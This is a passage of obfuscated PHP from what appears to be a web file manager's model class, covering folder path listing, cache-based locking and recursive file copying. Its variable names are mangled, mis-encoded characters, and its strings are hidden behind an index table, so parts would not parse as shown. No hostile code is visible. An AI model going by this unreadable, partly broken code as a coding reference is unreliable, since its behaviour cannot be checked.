str_replace($ŒâéÚöæ[601], $ŒâéÚöæ[8], $¸ÑŒŠé); if ($½¾­Ş Ñ[$ŒâéÚöæ[202]] == $ŒâéÚöæ[238]) { $½¾­Ş Ñ[$ŒâéÚöæ[32]] = trim($ôá™ÃÔğ[$½¾­Ş Ñ[$ŒâéÚöæ[203]]], $ŒâéÚöæ[8]); $½¾­Ş Ñ[$ŒâéÚöæ[591]] = $½¾­Ş Ñ[$ŒâéÚöæ[32]] . $ŒâéÚöæ[8]; } if (intval($½¾­Ş Ñ[$ŒâéÚöæ[200]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($½¾­Ş Ñ, $¥‰í„æ¼, $Ş÷·Îò); } } unset($½¾­Ş Ñ); return $›´‚„íâ; } private function _listAppendPathRecycle(&$µ’ŠÙÖ, $«¿ûé¸Ë, $Ùƒáüë) { $¼è¿¿Ÿ =& $_SERVER[ÕŸ²ó÷å]; if (!in_array($Ùƒáüë, $«¿ûé¸Ë) && $µ’ŠÙÖ[$¼è¿¿Ÿ[203]] != $Ùƒáüë) { return; } $Û™å÷øú = explode($¼è¿¿Ÿ[8], trim($µ’ŠÙÖ[$¼è¿¿Ÿ[591]], $¼è¿¿Ÿ[8])); $Ñº§Òş = implode($¼è¿¿Ÿ[8], array_slice($Û™å÷øú, 2)); $µ’ŠÙÖ[$¼è¿¿Ÿ[591]] = $¼è¿¿Ÿ[8] . LNG($¼è¿¿Ÿ[602]) . $¼è¿¿Ÿ[8] . ltrim($Ñº§Òş, $¼è¿¿Ÿ[8]); $µ’ŠÙÖ[$¼è¿¿Ÿ[593]] = $¼è¿¿Ÿ[603] . implode($¼è¿¿Ÿ[50], array_slice($«¿ûé¸Ë, 1)) . $¼è¿¿Ÿ[50]; if ($µ’ŠÙÖ[$¼è¿¿Ÿ[203]] == $Ùƒáüë) { $µ’ŠÙÖ[$¼è¿¿Ÿ[593]] = $¼è¿¿Ÿ[603]; $µ’ŠÙÖ[$¼è¿¿Ÿ[202]] = $¼è¿¿Ÿ[238]; $µ’ŠÙÖ[$¼è¿¿Ÿ[32]] = LNG($¼è¿¿Ÿ[602]); } $µ’ŠÙÖ[$¼è¿¿Ÿ[604]] = $¼è¿¿Ÿ[605]; } protected function _listAppendPathRoot(&$£™‚•­¾, $ê¾îÉ±) { $˜÷¼éä =& $_SERVER[ÕŸ²ó÷å]; static $ñ²¿Ë–£ = false; $üôñüº = $˜÷¼éä[12]; if ($£™‚•­¾[$˜÷¼éä[200]] == self::TYPE_USER) { if ($£™‚•­¾[$˜÷¼éä[578]] == USER_ID) { $üôñüº = LNG($˜÷¼éä[606]); if ($ñ²¿Ë–£ === !1) { $û¢…Õæı = Model($˜÷¼éä[607])->getInfoFull(USER_ID); $ñ²¿Ë–£ = _get($û¢…Õæı, $˜÷¼éä[608], $˜÷¼éä[12]); } if ($ê¾îÉ± && $ê¾îÉ±[0] == $ñ²¿Ë–£ || !$ê¾îÉ± && $£™‚•­¾[$˜÷¼éä[203]] == $ñ²¿Ë–£) { $üôñüº = LNG($˜÷¼éä[609]); $£™‚•­¾[$˜÷¼éä[610]] = $˜÷¼éä[611]; } if (!$ê¾îÉ±) { $£™‚•­¾[$˜÷¼éä[32]] = $üôñüº; } } else { $£™‚•­¾[$˜÷¼éä[612]] = Model($˜÷¼éä[586])->getInfoSimpleOuter($£™‚•­¾[$˜÷¼éä[578]]); $üôñüº = LNG($˜÷¼éä[613]) . $˜÷¼éä[186] . $£™‚•­¾[$˜÷¼éä[612]][$˜÷¼éä[32]] . $˜÷¼éä[188]; } } else { if ($£™‚•­¾[$˜÷¼éä[200]] == self::TYPE_GROUP) { $¼ÏÕ³ = Model($˜÷¼éä[594])->getInfoSimple($£™‚•­¾[$˜÷¼éä[578]]); $üôñüº = $¼ÏÕ³[$˜÷¼éä[32]]; } else { if ($£™‚•­¾[$˜÷¼éä[200]] == self::TYPE_SYSTEM) { $üôñüº = $˜÷¼éä[614]; } } } $üôñüº = $üôñüº ? $˜÷¼éä[8] . $üôñüº . $˜÷¼éä[8] : $˜÷¼éä[8]; return $üôñüº; } protected function _listAppendUser(&$½É‡áâ¦) { $¾½²Ù£ =& $_SERVER[ÕŸ²ó÷å]; $ÄÆÎñÃä = array_to_keyvalue($½É‡áâ¦, $¾½²Ù£[12], $¾½²Ù£[536]); $ìŠ¸í»Î = array_to_keyvalue($½É‡áâ¦, $¾½²Ù£[12], $¾½²Ù£[538]); $½¼ËÂ¯ß = array_merge($ÄÆÎñÃä, $ìŠ¸í»Î); $•ê‡şÅ = Model($¾½²Ù£[607])->userListInfo($½¼ËÂ¯ß); foreach ($½É‡áâ¦ as &$ĞÕ¶è‘ï) { $ŠÆ¿á‘Ë = $ĞÕ¶è‘ï[$¾½²Ù£[536]]; $ĞÕ¶è‘ï[$¾½²Ù£[536]] = $•ê‡şÅ[$ŠÆ¿á‘Ë] ? $•ê‡şÅ[$ŠÆ¿á‘Ë] : !1; $ŠÆ¿á‘Ë = $ĞÕ¶è‘ï[$¾½²Ù£[538]]; $ĞÕ¶è‘ï[$¾½²Ù£[538]] = $•ê‡şÅ[$ŠÆ¿á‘Ë] ? $•ê‡şÅ[$ŠÆ¿á‘Ë] : !1; if (_get($ĞÕ¶è‘ï, $¾½²Ù£[615], 0)) { $Œ×Ôõ  = $GLOBALS[$¾½²Ù£[6]][$¾½²Ù£[102]][$¾½²Ù£[616]]; if ($ĞÕ¶è‘ï[$¾½²Ù£[548]][$¾½²Ù£[617]] <= time() - $Œ×Ôõ ) { $this->metaSet($ĞÕ¶è‘ï[$¾½²Ù£[203]], $¾½²Ù£[618], null); $this->metaSet($ĞÕ¶è‘ï[$¾½²Ù£[203]], $¾½²Ù£[617], null); unset($ĞÕ¶è‘ï[$¾½²Ù£[548]][$¾½²Ù£[618]]); continue; } $ó§·•ùÖ = $ĞÕ¶è‘ï[$¾½²Ù£[548]][$¾½²Ù£[618]]; $ĞÕ¶è‘ï[$¾½²Ù£[548]][$¾½²Ù£[619]] = Model($¾½²Ù£[607])->getInfoSimpleOuter($ó§·•ùÖ); } } unset($ĞÕ¶è‘ï); } public function parentLevelArray($“™¤©™¶) { $ŒúÓ€ã =& $_SERVER[ÕŸ²ó÷å]; $“™¤©™¶ = explode($ŒúÓ€ã[50], trim($“™¤©™¶, $ŒúÓ€ã[50])); return array_remove_value($“™¤©™¶, $ŒúÓ€ã[238]); } public function listAll($Âø²“°à) { $¨ºÄ¢ı =& $_SERVER[ÕŸ²ó÷å]; $úà†íëå = $this->sourceInfo($Âø²“°à); $ûÍ—âŞ = array($¨ºÄ¢ı[620] => array($¨ºÄ¢ı[621], $úà†íëå[$¨ºÄ¢ı[593]] . $Âø²“°à . $¨ºÄ¢ı[622]), $¨ºÄ¢ı[623] => 0); $ÂÓœ„åõ = $¨ºÄ¢ı[624]; $Ú£ÃÖ·Å = "\x4c\105\x46\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\137\x66\x69\x6c\145\40\x66\x69\x6c\x65\40\x6f\156\x20\x73\x6f\x75\x72\143\x65\56\x66\151\154\x65\x49\104\x20\75\40\x66\x69\x6c\x65\56\146\x69\x6c\145\x49\104"; $ÜÎÖ°ß = $this->alias($¨ºÄ¢ı[528])->field($ÂÓœ„åõ)->where($ûÍ—âŞ)->join($Ú£ÃÖ·Å)->select(); $this->_listAppendAuth($ÜÎÖ°ß); $this->_listAppendUser($ÜÎÖ°ß); $this->_listAppendPath($ÜÎÖ°ß); $ÜÎÖ°ß = array_to_keyvalue($ÜÎÖ°ß, $¨ºÄ¢ı[203]); $°Ï¶£ = "\57{$úà†íëå[$¨ºÄ¢ı[32]]}\57"; $°Ï¶£ = $°Ï¶£ == $¨ºÄ¢ı[601] ? $¨ºÄ¢ı[8] : $°Ï¶£; $¿œç–Şœ = array(); foreach ($ÜÎÖ°ß as $éåóÄúß => $°š–û·¼) { $½ÅëØ® = $this->parentLevelArray($°š–û·¼[$¨ºÄ¢ı[593]]); array_shift($½ÅëØ®); $“ˆ’’ŸÄ = $°Ï¶£; for ($ŸÑâ…Øå = 0; $ŸÑâ…Øå < count($½ÅëØ®); $ŸÑâ…Øå++) { $“ˆ’’ŸÄ .= $ÜÎÖ°ß[$½ÅëØ®[$ŸÑâ…Øå]][$¨ºÄ¢ı[32]] . $¨ºÄ¢ı[8]; } $“ˆ’’ŸÄ .= $°š–û·¼[$¨ºÄ¢ı[32]]; if ($°š–û·¼[$¨ºÄ¢ı[494]]) { $“ˆ’’ŸÄ .= $¨ºÄ¢ı[8]; } $Ÿ‘’Ôê = array($¨ºÄ¢ı[504] => str_replace($¨ºÄ¢ı[601], $¨ºÄ¢ı[8], str_replace($¨ºÄ¢ı[601], $¨ºÄ¢ı[8], str_replace($¨ºÄ¢ı[601], $¨ºÄ¢ı[8], $“ˆ’’ŸÄ))), $¨ºÄ¢ı[625] => intval($°š–û·¼[$¨ºÄ¢ı[494]]), $¨ºÄ¢ı[626] => intval($°š–û·¼[$¨ºÄ¢ı[89]]), $¨ºÄ¢ı[98] => intval($°š–û·¼[$¨ºÄ¢ı[98]]), $¨ºÄ¢ı[100] => $this->pathInfoFilter($°š–û·¼)); if (!$Ÿ‘’Ôê[$¨ºÄ¢ı[494]]) { $Ÿ‘’Ôê[$¨ºÄ¢ı[550]] = $°š–û·¼[$¨ºÄ¢ı[550]]; } $¿œç–Şœ[] = $Ÿ‘’Ôê; } $¿œç–Şœ = array_sort_by($¿œç–Şœ, $¨ºÄ¢ı[97]); return $¿œç–Şœ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ëÖ³Å‘) { $øå¬ù“ª =& $_SERVER[ÕŸ²ó÷å]; if (!$this->allowLock()) { return; } $this->_lockCheck($øå¬ù“ª[627], $ëÖ³Å‘); $×Õ¢Ç©ş = 1; $this->_lockEvent($ëÖ³Å‘, array($øå¬ù“ª[628], $øå¬ù“ª[629]), $×Õ¢Ç©ş); $this->_lockParent($ëÖ³Å‘, array($øå¬ù“ª[629]), $×Õ¢Ç©ş); $this->_lockEvent($ëÖ³Å‘, array($øå¬ù“ª[630], $øå¬ù“ª[631]), $×Õ¢Ç©ş); $this->_lockCheckEnd($øå¬ù“ª[627], $ëÖ³Å‘); } public function lockCopyEnd($»Ëıé) { $÷ƒÑÌæĞ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->allowLock()) { return; } $¾‰ò•‡‡ = 0; $this->_lockEvent($»Ëıé, array($÷ƒÑÌæĞ[628], $÷ƒÑÌæĞ[629]), $¾‰ò•‡‡); $this->_lockParent($»Ëıé, array($÷ƒÑÌæĞ[629]), $¾‰ò•‡‡); $this->_lockEvent($»Ëıé, array($÷ƒÑÌæĞ[630], $÷ƒÑÌæĞ[631]), $¾‰ò•‡‡); } public function lockWriteStart($úÎ§…÷ª, $ªµÃóñ = '') { $ß‘ºÄ‚‰ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->allowLock()) { return; } $this->_lockCheck($ß‘ºÄ‚‰[628], $úÎ§…÷ª); $õ‡ØâÛŞ = 1; $this->_lockKey($ß‘ºÄ‚‰[632] . $úÎ§…÷ª . $ß‘ºÄ‚‰[10] . $ªµÃóñ, $õ‡ØâÛŞ); $this->_lockEvent($úÎ§…÷ª, array($ß‘ºÄ‚‰[627], $ß‘ºÄ‚‰[629]), $õ‡ØâÛŞ); $this->_lockParent($úÎ§…÷ª, array($ß‘ºÄ‚‰[627], $ß‘ºÄ‚‰[629]), $õ‡ØâÛŞ); $this->_lockCheckEnd($ß‘ºÄ‚‰[628], $úÎ§…÷ª); } public function lockWriteEnd($×–­ƒÇñ, $©ÊÒÚ˜¯ = '') { $¯Õê…ÓŠ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->allowLock()) { return; } $ŞíÉëÏ = 0; $this->_lockKey($¯Õê…ÓŠ[632] . $×–­ƒÇñ . $¯Õê…ÓŠ[10] . $©ÊÒÚ˜¯, $ŞíÉëÏ); $this->_lockEvent($×–­ƒÇñ, array($¯Õê…ÓŠ[627], $¯Õê…ÓŠ[629]), $ŞíÉëÏ); $this->_lockParent($×–­ƒÇñ, array($¯Õê…ÓŠ[627], $¯Õê…ÓŠ[629]), $ŞíÉëÏ); } public function lockMoveStart($Å‰¤èú) { $éå¹Å¡ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->allowLock()) { return; } $this->_lockCheck($éå¹Å¡[629], $Å‰¤èú); $Ã×ªÊğ = 1; $this->_lockKey($éå¹Å¡[633] . $Å‰¤èú, $Ã×ªÊğ); $this->_lockEvent($Å‰¤èú, array($éå¹Å¡[627], $éå¹Å¡[628]), $Ã×ªÊğ); $this->_lockParent($Å‰¤èú, array($éå¹Å¡[627], $éå¹Å¡[629]), $Ã×ªÊğ); $this->_lockEvent($Å‰¤èú, array($éå¹Å¡[634], $éå¹Å¡[630], $éå¹Å¡[631]), $Ã×ªÊğ); $this->_lockCheckEnd($éå¹Å¡[629], $Å‰¤èú); } public function lockMoveEnd($ßÙİÎì¤) { $®¶ØéÇá =& $_SERVER[ÕŸ²ó÷å]; if (!$this->allowLock()) { return; } $€Ê¼©†š = 0; $this->_lockKey($®¶ØéÇá[633] . $ßÙİÎì¤, $€Ê¼©†š); $this->_lockEvent($ßÙİÎì¤, array($®¶ØéÇá[627], $®¶ØéÇá[628]), $€Ê¼©†š); $this->_lockParent($ßÙİÎì¤, array($®¶ØéÇá[627], $®¶ØéÇá[629]), $€Ê¼©†š); $this->_lockEvent($ßÙİÎì¤, array($®¶ØéÇá[634], $®¶ØéÇá[630], $®¶ØéÇá[631]), $€Ê¼©†š); } private function _lockCheck($„’»™çì, $¡ú””Ã) { $¶–é²„Å =& $_SERVER[ÕŸ²ó÷å]; $‚›Óáé› = $this->sourceInfo($¡ú””Ã); $ÕÑ®’àù = $„’»™çì . $¶–é²„Å[10] . $¡ú””Ã; $this->_lockTimeStart[$ÕÑ®’àù] = timeFloat(); if (!is_array($‚›Óáé›)) { return; } $î¼Ò¤şİ = LNG($¶–é²„Å[635]); CacheLock::setErrorMsg($¶–é²„Å[186] . htmlspecialchars($‚›Óáé›[$¶–é²„Å[32]]) . $¶–é²„Å[188] . $î¼Ò¤şİ); $this->_lockKey($ÕÑ®’àù, 1); $this->_lockKey($ÕÑ®’àù, 0); $ÉÔ·ãÃó = array_reverse($this->parentLevelArray($‚›Óáé›[$¶–é²„Å[593]])); foreach ($ÉÔ·ãÃó as $Á¯×®ü¹) { $ÕÑ®’àù = $„’»™çì . $¶–é²„Å[636] . $Á¯×®ü¹; if (CacheLock::lockGet($¶–é²„Å[637] . $ÕÑ®’àù)) { $‚›Óáé› = $this->sourceInfo($Á¯×®ü¹); CacheLock::setErrorMsg($¶–é²„Å[186] . htmlspecialchars($‚›Óáé›[$¶–é²„Å[32]]) . $¶–é²„Å[188] . $î¼Ò¤şİ); $this->_lockKey($ÕÑ®’àù, 1); $this->_lockKey($ÕÑ®’àù, 0); } } } private function _lockCheckEnd($ä¤Êëº», $ª‚Ë³ˆ‘) { $Ëº•–•– =& $_SERVER[ÕŸ²ó÷å]; $…î¶Ğ§  = $ä¤Êëº» . $Ëº•–•–[10] . $ª‚Ë³ˆ‘; CacheLock::setErrorMsg($Ëº•–•–[463]); if (!isset($this->_lockTimeStart[$…î¶Ğ§ ])) { return; } $¡„ĞÔ›ä = timeFloat() - $this->_lockTimeStart[$…î¶Ğ§ ]; unset($this->_lockTimeStart[$…î¶Ğ§ ]); if ($¡„ĞÔ›ä > 0.5) { unset(self::$cacheSourceInfo[$Ëº•–•–[542] . $ª‚Ë³ˆ‘]); } $İ‰Ãºá‡ = $this->sourceInfo($ª‚Ë³ˆ‘); if (!$İ‰Ãºá‡) { show_json(LNG($Ëº•–•–[118]), !1); } } private function _lockParent($Û³í…—©, $¼¾ÎæÀŸ, $õÆ­Î£Æ) { if (!$this->autoLockSet) { return; } $é¡•¯İù = $this->sourceInfo($Û³í…—©); if (!is_array($é¡•¯İù)) { return; } $õŸ»Ğè„ = array_reverse($this->parentLevelArray($é¡•¯İù[$_SERVER[ÕŸ²ó÷å][593]])); foreach ($õŸ»Ğè„ as $åÛŸôÎ) { $this->_lockEvent($åÛŸôÎ, $¼¾ÎæÀŸ, $õÆ­Î£Æ); } } private function _lockEvent($ô»ìÍßß, $¸ï¨üÒ„, $¿ñ¬ğ¯Œ) { $íüğĞÙ” =& $_SERVER[ÕŸ²ó÷å]; if (!$this->autoLockSet) { return; } foreach ($¸ï¨üÒ„ as $ÂÒ™û”²) { $›ÅñŠÙ» = $ÂÒ™û”² . $íüğĞÙ”[10] . $ô»ìÍßß; if ($¿ñ¬ğ¯Œ && CacheLock::lockGet($íüğĞÙ”[637] . $›ÅñŠÙ»)) { continue; } $this->_lockKey($›ÅñŠÙ», $¿ñ¬ğ¯Œ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ş¼„Ó•, $ú¹æ İ­ = 1) { $¾âÊ°— = $_SERVER[ÕŸ²ó÷å][637] . md5($ş¼„Ó•); if ($ú¹æ İ­) { if (isset(self::$_lockItemArr[$¾âÊ°—])) { return; } self::$_lockItemArr[$¾âÊ°—] = 1; CacheLock::lock($¾âÊ°—, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¾âÊ°—])) { return; } unset(self::$_lockItemArr[$¾âÊ°—]); CacheLock::unlock($¾âÊ°—); } } public function isParentOf($æ›Àß£¡, $’üëĞ“) { $‘Ó¹Áë =& $_SERVER[ÕŸ²ó÷å]; $´«¿¥áé = $this->sourceInfo($æ›Àß£¡); $©‚Øµ®» = $this->sourceInfo($’üëĞ“); $Ùê¥ÆÙ´ = $´«¿¥áé[$‘Ó¹Áë[593]] . $´«¿¥áé[$‘Ó¹Áë[203]] . $‘Ó¹Áë[50]; $Á˜ÆÏö‡ = $©‚Øµ®»[$‘Ó¹Áë[593]] . $©‚Øµ®»[$‘Ó¹Áë[203]] . $‘Ó¹Áë[50]; $€çÉœ–˜ = strpos($Á˜ÆÏö‡, $Ùê¥ÆÙ´) === 0; return $€çÉœ–˜; } private $targetIsDelete = 0; public function copy($íºŞ—º¿, $Œ‘çë«È, $ŞçŞß®Ì = REPEAT_REPLACE, $ßƒ¥Ñ›¥ = '') { $‰Ïî×Ì‘ =& $_SERVER[ÕŸ²ó÷å]; $øåĞ¯¶¼ = $this->sourceInfo($íºŞ—º¿); $£ğ¹Ş = $this->sourceInfo($Œ‘çë«È); if (!$øåĞ¯¶¼ || !$£ğ¹Ş || $£ğ¹Ş[$‰Ïî×Ì‘[494]] != $‰Ïî×Ì‘[101]) { return !1; } if ($this->isParentOf($íºŞ—º¿, $Œ‘çë«È)) { return !1; } $ùôÙ­ = $ßƒ¥Ñ›¥ ? $ßƒ¥Ñ›¥ : $øåĞ¯¶¼[$‰Ïî×Ì‘[32]]; $this->lockCopyStart($íºŞ—º¿); $this->lockWriteStart($Œ‘çë«È, $ùôÙ­); $Øş…½ÊÄ = array($‰Ïî×Ì‘[638] => array(), $‰Ïî×Ì‘[639] => array(), $‰Ïî×Ì‘[640] => array()); $this->targetIsDelete = intval($øåĞ¯¶¼[$‰Ïî×Ì‘[514]]); $’± ƒîƒ = $this->fileNameExistAuto($Œ‘çë«È, $øåĞ¯¶¼); $ÆÔ¸ÚÕ = $this->_copy($íºŞ—º¿, $Œ‘çë«È, $ŞçŞß®Ì, $Øş…½ÊÄ, !0, $ßƒ¥Ñ›¥); $this->_childrenListClear(); $this->lockCopyEnd($íºŞ—º¿); $this->lockWriteEnd($Œ‘çë«È, $ùôÙ­); if ($øåĞ¯¶¼[$‰Ïî×Ì‘[494]] == $‰Ïî×Ì‘[101] && $’± ƒîƒ == $ÆÔ¸ÚÕ) { $this->folderSizeResetChildren($’± ƒîƒ); } Model($‰Ïî×Ì‘[641])->addAll($Øş…½ÊÄ[$‰Ïî×Ì‘[639]], array(), !0); if ($’± ƒîƒ != $ÆÔ¸ÚÕ || $øåĞ¯¶¼[$‰Ïî×Ì‘[494]] == $‰Ïî×Ì‘[101]) { Model($‰Ïî×Ì‘[642])->eventCopy($ÆÔ¸ÚÕ); } $this->saveAll($Øş…½ÊÄ[$‰Ïî×Ì‘[640]]); Model($‰Ïî×Ì‘[240])->linkAdd($Øş…½ÊÄ[$‰Ïî×Ì‘[638]]); $this->folderSizeReset($Œ‘çë«È); $this->updateModifyTime($Œ‘çë«È); return $ÆÔ¸ÚÕ; } private function _copy($¡´‘µ×Ú, $¿º„ë…, $çÙ³ƒêî, &$Ø£ï“ƒ¸, $Í©™¬±¶, $šçİ†ÂÉ = '') { $º–Ğ¿— =& $_SERVER[ÕŸ²ó÷å]; $˜Ãùà–ö = $this->sourceInfoCache($¡´‘µ×Ú); $÷Ï¥µÏĞ = $˜Ãùà–ö[$º–Ğ¿—[494]] == $º–Ğ¿—[101]; $ŸÛÛçìö = $šçİ†ÂÉ ? $šçİ†ÂÉ : $˜Ãùà–ö[$º–Ğ¿—[32]]; $Ìü½©‹­ = $this->fileNameExistAuto($¿º„ë…, $˜Ãùà–ö); if ($Í©™¬±¶) { $this->_childrenAllMake($¡´‘µ×Ú); if ($÷Ï¥µÏĞ && $Ìü½©‹­) { $this->_childrenAllMake($Ìü½©‹­); } } if (!$Ìü½©‹­) { return $this->_copyCreate($¡´‘µ×Ú, $¿º„ë…, $ŸÛÛçìö, $Ø£ï“ƒ¸); } $ì›Œ¬¡î = $Ìü½©‹­; if ($÷Ï¥µÏĞ) { if ($çÙ³ƒêî == REPEAT_RENAME_FOLDER) { $ŸÛÛçìö = $this->fileNameAutoCache($¿º„ë…, $ŸÛÛçìö, $çÙ³ƒêî, $÷Ï¥µÏĞ); $ì›Œ¬¡î = $this->_copyCreate($¡´‘µ×Ú, $¿º„ë…, $ŸÛÛçìö, $Ø£ï“ƒ¸); } else { $‘ÙªÅ³ = $this->_childrenList($¡´‘µ×Ú); foreach ($‘ÙªÅ³ as $ˆõ¥é½Ï) { $this->_copy($ˆõ¥é½Ï[$º–Ğ¿—[203]], $Ìü½©‹­, $çÙ³ƒêî, $Ø£ï“ƒ¸, !1); } } } else { if ($çÙ³ƒêî == REPEAT_RENAME || $çÙ³ƒêî == REPEAT_RENAME_FOLDER) { $ŸÛÛçìö = $this->fileNameAutoCache($¿º„ë…, $ŸÛÛçìö, $çÙ³ƒêî, $÷Ï¥µÏĞ); $ì›Œ¬¡î = $this->_copyCreate($¡´‘µ×Ú, $¿º„ë…, $ŸÛÛçìö, $Ø£ï“ƒ¸); } else { if ($çÙ³ƒêî == REPEAT_REPLACE) { $£»ÁØæ´ = $this->sourceInfoCache($Ìü½©‹­); $ËÄ€à = $this->fileHistory($£»ÁØæ´, $˜Ãùà–ö[$º–Ğ¿—[550]], $˜Ãùà–ö[$º–Ğ¿—[89]]); if ($ËÄ€à) { $Ø£ï“ƒ¸[$º–Ğ¿—[638]][] = $˜Ãùà–ö[$º–Ğ¿—[550]]; } } else { if ($çÙ³ƒêî == REPEAT_SKIP) { } } } Hook::trigger($º–Ğ¿—[643], array($º–Ğ¿—[644], $˜Ãùà–ö, 0)); } return $ì›Œ¬¡î; } private function _copyCreate($Ä¶¸ú, $ü¢™ë§Ş, $ïÎÓµá, &$Å÷ªÀá¦) { $·ÉĞ¾‚ù =& $_SERVER[ÕŸ²ó÷å]; $¸¸Ïüµˆ = $this->sourceInfoCache($Ä¶¸ú); $»–ô‰É² = $this->sourceInfoCache($ü¢™ë§Ş); $ÉŒ®¯«™ = $this->_makeItemData($¸¸Ïüµˆ, $»–ô‰É², $ïÎÓµá); Hook::trigger($·ÉĞ¾‚ù[645], $ÉŒ®¯«™); Hook::trigger($·ÉĞ¾‚ù[646], array($·ÉĞ¾‚ù[647], $ÉŒ®¯«™, 0)); $›Óøõ™ = $this->add($ÉŒ®¯«™); $ù±´ŒùÉ = array($·ÉĞ¾‚ù[203] => $›Óøõ™, $·ÉĞ¾‚ù[32] => $ïÎÓµá); $this->_copyApplyMeta($ù±´ŒùÉ, $Å÷ªÀá¦); if ($¸¸Ïüµˆ[$·ÉĞ¾‚ù[494]] != $·ÉĞ¾‚ù[101]) { $Å÷ªÀá¦[$·ÉĞ¾‚ù[638]][] = $¸¸Ïüµˆ[$·ÉĞ¾‚ù[550]]; return $›Óøõ™; } $ì‹Ö–Õ¿ = array(); $–…øŞ¬İ = array(); $this->_childrenListAll($Ä¶¸ú, $ì‹Ö–Õ¿); $Ë½çõ¡ = count($ì‹Ö–Õ¿); if ($Ë½çõ¡ == 0) { return $›Óøõ™; } $îàùŸ—ø = $this->sourceInfo($›Óøõ™); foreach ($ì‹Ö–Õ¿ as $©€ÔÍŒ) { $È’±Îœ = $this->_makeItemData($©€ÔÍŒ, $îàùŸ—ø, $©€ÔÍŒ[$·ÉĞ¾‚ù[32]]); $È’±Îœ[$·ÉĞ¾‚ù[593]] = $©€ÔÍŒ[$·ÉĞ¾‚ù[593]]; $–…øŞ¬İ[] = $È’±Îœ; } $this->chunkEventSet($·ÉĞ¾‚ù[648], array($·ÉĞ¾‚ù[649], $ÉŒ®¯«™, $Ë½çõ¡)); $this->addAll($–…øŞ¬İ, array(), !1); $Ÿ—‚‚ıÈ = $this->where(array($·ÉĞ¾‚ù[202] => $›Óøõ™))->select(); $ïÕ…ÈÜÂ = $this->_childrenMakeRelation($ì‹Ö–Õ¿, $Ÿ—‚‚ıÈ); $ïÕ…ÈÜÂ[$Ä¶¸ú] = $›Óøõ™; $†ˆ®ë¿ = array(); $âÉáÍá = array(); foreach ($Ÿ—‚‚ıÈ as $©€ÔÍŒ) { $å§Ã‚‹ë = $©€ÔÍŒ[$·ÉĞ¾‚ù[203]]; $ÖëÄõ“¸ = $this->_childrenMatch($ïÕ…ÈÜÂ, $©€ÔÍŒ, $îàùŸ—ø); $†ˆ®ë¿[] = array($·ÉĞ¾‚ù[203], $å§Ã‚‹ë, $·ÉĞ¾‚ù[202], $ÖëÄõ“¸[$·ÉĞ¾‚ù[202]]); $âÉáÍá[] = array($·ÉĞ¾‚ù[203], $å§Ã‚‹ë, $·ÉĞ¾‚ù[593], $ÖëÄõ“¸[$·ÉĞ¾‚ù[593]]); $this->_copyApplyMeta($©€ÔÍŒ, $Å÷ªÀá¦); if ($©€ÔÍŒ[$·ÉĞ¾‚ù[494]] != $·ÉĞ¾‚ù[101]) { $Å÷ªÀá¦[$·ÉĞ¾‚ù[638]][] = $©€ÔÍŒ[$·ÉĞ¾‚ù[550]]; } } $this->chunkEventSet($·ÉĞ¾‚ù[650], array($·ÉĞ¾‚ù[651], $ÉŒ®¯«™, $Ë½çõ¡)); $this->saveAll($†ˆ®ë¿); $this->chunkEventSet($·ÉĞ¾‚ù[652], array($·ÉĞ¾‚ù[653], $ÉŒ®¯«™, $Ë½çõ¡)); $this->saveAll($âÉáÍá); return $›Óøõ™; } private function _childrenMakeRelation($‚ò²œ‰¨, $±¾òÂ©™) { $Ã¼ÃÉ„… =& $_SERVER[ÕŸ²ó÷å]; $©ºƒ‹–Î = array(); $¾ùòÌ¶¤ = array(); foreach ($‚ò²œ‰¨ as $››¶±Üê) { $¤½êô»¾ = $››¶±Üê[$Ã¼ÃÉ„…[32]] . $Ã¼ÃÉ„…[8] . $››¶±Üê[$Ã¼ÃÉ„…[593]]; $©ºƒ‹–Î[$¤½êô»¾] = $››¶±Üê[$Ã¼ÃÉ„…[203]]; } foreach ($±¾òÂ©™ as $››¶±Üê) { $¤½êô»¾ = $››¶±Üê[$Ã¼ÃÉ„…[32]] . $Ã¼ÃÉ„…[8] . $››¶±Üê[$Ã¼ÃÉ„…[593]]; $îáı„Ìë = $©ºƒ‹–Î[$¤½êô»¾]; $¾ùòÌ¶¤[$îáı„Ìë] = $››¶±Üê[$Ã¼ÃÉ„…[203]]; } return $¾ùòÌ¶¤; } private function _childrenMatch($†Š˜êÎ†, $šşª¡Ú¸, $´ÇœÙÒ”) { $„¾á¤Ÿì =& $_SERVER[ÕŸ²ó÷å]; $©ïî¬¡¡ = $´ÇœÙÒ”[$„¾á¤Ÿì[593]]; $üá ı§¡ = $this->parentLevelArray($šşª¡Ú¸[$„¾á¤Ÿì[593]]); foreach ($üá ı§¡ as $ûşÆÄÌ) { if (isset($†Š˜êÎ†[$ûşÆÄÌ])) { $©ïî¬¡¡ .= $†Š˜êÎ†[$ûşÆÄÌ] . $„¾á¤Ÿì[654]; } } $©ïî¬¡¡ = rtrim($©ïî¬¡¡, $„¾á¤Ÿì[50]) . $„¾á¤Ÿì[50]; $©»¾£Ö² = $this->parentLevelArray($©ïî¬¡¡); $§±œó¨ù = $©»¾£Ö²[count($©»¾£Ö²) - 1]; return array($„¾á¤Ÿì[202] => $§±œó¨ù, $„¾á¤Ÿì[593] => $©ïî¬¡¡); } private function _makeItemData($Æê¾ˆŠÁ, $ü’’íõ, $•ºÏ—ºğ) { $İÉßäı =& $_SERVER[ÕŸ²ó÷å]; $Î§ÂÃÏ = array($İÉßäı[655] => $Æê¾ˆŠÁ[$İÉßäı[494]], $İÉßäı[503] => $•ºÏ—ºğ, $İÉßäı[656] => $Æê¾ˆŠÁ[$İÉßäı[495]] ? $Æê¾ˆŠÁ[$İÉßäı[495]] : $İÉßäı[12], $İÉßäı[551] => $Æê¾ˆŠÁ[$İÉßäı[550]] ? $Æê¾ˆŠÁ[$İÉßäı[550]] : 0, $İÉßäı[626] => $Æê¾ˆŠÁ[$İÉßäı[89]] ? $Æê¾ˆŠÁ[$İÉßäı[89]] : 0, $İÉßäı[657] => intval($ü’’íõ[$İÉßäı[200]]), $İÉßäı[658] => intval($ü’’íõ[$İÉßäı[578]]), 